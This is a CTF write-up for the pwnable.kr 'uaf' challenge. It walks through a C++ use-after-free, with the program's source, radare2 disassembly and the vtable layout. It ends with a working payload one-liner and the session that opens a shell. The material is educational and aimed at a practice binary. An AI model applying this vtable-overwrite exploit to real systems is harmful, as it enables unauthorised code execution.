---
title: UAF - Pwnable.kr
date: 2016-09-06
categories: [Writeups, Pwnable.kr]
tags: ['UAF']
image:
    path: "/unsorted/pwnablekr.png"
---

Let's have a look to the code of `uaf.cpp`:
   
```c
#include <fcntl.h>
#include <iostream>
#include <cstring>
#include <cstdlib>
#include <unistd.h>
using namespace std;

class Human{
private:
    virtual void give_shell(){
        system("/bin/sh");
    }
protected:
    int age;
    string name;
public:
    virtual void introduce(){
        cout << "My name is " << name << endl;
        cout << "I am " << age << " years old" << endl;
    }
};

class Man: public Human{
public:
    Man(string name, int age){
        this->name = name;
        this->age = age;
        }
        virtual void introduce(){
        Human::introduce();
                cout << "I am a nice guy!" << endl;
        }
};

class Woman: public Human{
public:
        Woman(string name, int age){
                this->name = name;
                this->age = age;
        }
        virtual void introduce(){
                Human::introduce();
                cout << "I am a cute girl!" << endl;
        }
};

int main(int argc, char* argv[]){
    Human* m = new Man("Jack", 25);
    Human* w = new Woman("Jill", 21);

    size_t len;
    char* data;
    unsigned int op;
    while(1){
        cout << "1. use\n2. after\n3. free\n";
        cin >> op;

        switch(op){
            case 1:
                m->introduce();
                w->introduce();
                break;
            case 2:
                len = atoi(argv[1]);
                data = new char[len];
                read(open(argv[2], O_RDONLY), data, len);
                cout << "your data is allocated" << endl;
                break;
            case 3:
                delete m;
                delete w;
                break;
            default:
                break;
        }
    }

    return 0;
}
```


The program displays a simple menu and lets us perform one of the following actions in any order we want:
1 - call the method *introduce*
2 - allocate `argv[1]` bytes and fill them with the data read from the file `argv[2]` 
3 - delete `m` and `w`

If we allocate new data (action number 2) after `m` and `w` have been deleted
(action number 3) then we can probably obtain the data pointed by `m` and `w`
to be overwritten by the content of `argv[2]`.  If we can overwrite the content
of `m` and `w` we can also arrange that a call to the method *introduce*
(action number 1) would instead call the method *give_shell*.

In order to do that we need to understand how *introduce* is called. Let's have a look to the assembly code for the action number 1:

```nasm
[0x00400ec4]> pdb @0x400fcd
|           0x00400fcd      488b45c8       mov rax, qword [rbp - m] ; rax = m
|           0x00400fd1      488b00         mov rax, qword [rax]     ; rax = *rax
|           0x00400fd4      4883c008       add rax, 8               ; rax += 8
|           0x00400fd8      488b10         mov rdx, qword [rax]     ; rdx = *rax
|           0x00400fdb      488b45c8       mov rax, qword [rbp - m] ; rax = m
|           0x00400fdf      4889c7         mov rdi, rax             ; rdi = rax
|           0x00400fe2      ffd2           call rdx
|           0x00400fe4      488b45d0       mov rax, qword [rbp - w]
|           0x00400fe8      488b00         mov rax, qword [rax]
|           0x00400feb      4883c008       add rax, 8
|           0x00400fef      488b10         mov rdx, qword [rax]
|           0x00400ff2      488b45d0       mov rax, qword [rbp - w]
|           0x00400ff6      4889c7         mov rdi, rax
|           0x00400ff9      ffd2           call rdx
|       ,=< 0x00400ffb      e9a9000000     jmp 0x4010a9
```


The first two lines are used to fill the register `rax` with the first eight
bytes of the memory pointed by `m`, this last points to an instance of the
class *Man*. Then the value of `rax` is incremented by eight, passed to `rdi`
and used by the *call* instruction: this must be the address of the method *introduce*.
Furthermore the address pointed by `m` is passed as an argument to the method *introduce* trough the register `rdi`: this parameter represents the value of the keyword *this*.

To understand better what's going on, let's check out the constructor of the
class *Man*:

```nasm
[0x00400ec4]> pdf @sym.Man::Man
/ (fcn) sym.Man::Man 83
|           ; var int Age @ rbp-0x24
|           ; var int Name @ rbp-0x20
|           ; var int this @ rbp-0x18
|           ; CALL XREF from 0x00400f13 (sym.main)
|           0x00401264      55             push rbp
|           0x00401265      4889e5         mov rbp, rsp
|           0x00401268      53             push rbx
|           0x00401269      4883ec28       sub rsp, 0x28
|           0x0040126d      48897de8       mov qword [rbp - this], rdi
|           0x00401271      488975e0       mov qword [rbp - Name], rsi
|           0x00401275      8955dc         mov dword [rbp - Age], edx
|           0x00401278      488b45e8       mov rax, qword [rbp - this] ; rax = this
|           0x0040127c      4889c7         mov rdi, rax                ; rdi = rax
|           0x0040127f      e88cffffff     call sym.Human::Human       ; parent's constructor
|           0x00401284      488b45e8       mov rax, qword [rbp - this]
|           0x00401288      48c700701540.  mov qword [rax], 0x401570   ; *rax = 0x401570
|           0x0040128f      488b45e8       mov rax, qword [rbp - this]  
|           0x00401293      488d5010       lea rdx, [rax + 0x10]       
|           0x00401297      488b45e0       mov rax, qword [rbp - Name] 
|           0x0040129b      4889c6         mov rsi, rax
|           0x0040129e      4889d7         mov rdi, rdx
|           0x004012a1      e80afbffff     call sym.std::string::operator_
|           0x004012a6      488b45e8       mov rax, qword [rbp - this]
|           0x004012aa      8b55dc         mov edx, dword [rbp - Age]
|           0x004012ad      895008         mov dword [rax + 8], edx
|           0x004012b0      4883c428       add rsp, 0x28
|           0x004012b4      5b             pop rbx
|           0x004012b5      5d             pop rbp
\           0x004012b6      c3             ret
```

The first value of the object is initialized with **0x401570**, this is the
address of the [vtable](https://en.wikipedia.org/wiki/Virtual_method_table)
for the class Man. Thus a Man instance would look more or less like this:

 - 0x00: Address vtable for Man (0x0000000000401570)
 - 0x08: Age
 - 0x10: &Name (Address a string)

This is the content of the vtable:

```nasm
0x00401570 .qword 0x000000000040117a ; sym.Human::give_shell
0x00401578 .qword 0x00000000004012d2 ; sym.Man::introduce
```

As expected the method *introduce* is the second in the vtable: this explains
the value of `rax` being incremented by eight before being passed to `rdx`. The
first entry in the vtable is the address of the method *give_shell*, so what
about we overwrite the address of the vtable with the address of the vtable
decremented by eight?  The new address would be 0x401570 - 0x8 = 0x401568 but
it needs to be coded using eight bytes in little endian format:

```console
uaf@ubuntu:~$ python -c 'print "\x68\x15\x40\x00\x00\x00\x00\x00"*1024' > /tmp/payload
uaf@ubuntu:~$ ./uaf 1024 /tmp/payload
1. use
2. after
3. free
3
1. use
2. after
3. free
2
your data is allocated
1. use
2. after
3. free
1
$ cat flag
yay_****_*****_pwning
```






